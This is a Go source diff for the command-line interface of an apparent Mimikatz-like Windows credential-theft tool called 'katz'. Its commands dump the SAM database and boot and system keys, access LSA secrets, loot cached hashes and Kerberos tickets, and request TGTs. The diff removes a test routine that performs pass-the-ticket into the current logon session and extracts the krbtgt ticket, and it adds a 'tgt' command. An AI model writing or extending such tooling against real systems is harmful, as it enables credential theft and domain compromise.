@@ -2,14 +2,12 @@ package cli
 
 import (
 	// "encoding/base64"
-	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"strings"
 
 	katz_modules "katz/katz/modules"
-	test "katz/katz/modules/kerb/ptt"
-	test_helpers "katz/katz/modules/kerb/ticketdump"
+
 	katz_utils "katz/katz/utils"
 
 	"github.com/spf13/cobra"
@@ -33,17 +31,6 @@ var testCmd = &cobra.Command{
 	Use: "test",
 	Short: "run test code",
 	Run: func (cmd *cobra.Command, args []string)  {
-		tgt, _ := test.TGT("test.local", "Administrator", "password")
-		handle, _ := test_helpers.GetLsaHandle()
-		LUID, _ := test_helpers.GetCurrentLUID()
-		err := test.Ptt(tgt, handle, LUID)
-		kerb := test_helpers.NewLSAString("kerberos")
-		pkgName, _ := test_helpers.GetAuthenticationPackage(handle, kerb)
-		fmt.Println(err)
-		err = test.PttMinimal()
-		fmt.Println(err)
-		data, err := test_helpers.ExtractTicket(handle, pkgName, LUID, "krbtgt/TEST.LOCAL")
-		fmt.Println(base64.StdEncoding.EncodeToString(data))
 
 	},
 }
@@ -68,6 +55,25 @@ var lootTickets = &cobra.Command{
 		}
 	},
 }
+var tgt = &cobra.Command{
+	Use: "tgt",
+	Short: "request a TGT, (it is recommended to purge klist before requesting a new ticket for the current user)",
+	Run: func(cmd *cobra.Command, args []string) {
+		username, _ := cmd.Flags().GetString("user")
+		passwd, _ := cmd.Flags().GetString("pass")
+		domain, _ := cmd.Flags().GetString("domain")
+		serviceName, _ := cmd.Flags().GetString("serviceName")
+		if serviceName == "" {
+			serviceName =  "krbtgt/"+ strings.ToUpper(domain)
+		}
+		response, err := katz_modules.TGT(username, domain, passwd, serviceName)
+		if err != nil {
+			response = err.Error()
+		}
+		fmt.Println(response)
+	},
+}
+
 
 var cached = &cobra.Command{
 	Use: "cached",
@@ -201,12 +207,20 @@ func Init() {
 	sam.Flags().Bool("dump", false, "dump sam database")
 	sam.Flags().Bool("bootKey", false, "get boot key")
 	sam.Flags().Bool("sysKey", false, "get system key")
+	tgt.Flags().String("user", "Administrator", "username flag (default is 'Administrator')")
+	tgt.Flags().String("pass", "password", "password flag, default is 'password'")
+	tgt.Flags().String("domain", "test.local", "domain flag, default is 'test.local'")
+	tgt.Flags().String("serviceName", "", "service name flag, default is empty and will go to 'krbtgt/<domain>'")
 
 	rootCmd.AddCommand(sam)
 	rootCmd.AddCommand(testCmd)
 	rootCmd.AddCommand(lsa)
+
 	cached.AddCommand(lootTickets)
 	cached.AddCommand(cached_hashes)
+
+	kerberos.AddCommand(tgt)
+
 	rootCmd.AddCommand(kerberos)
 	rootCmd.AddCommand(cached)
 
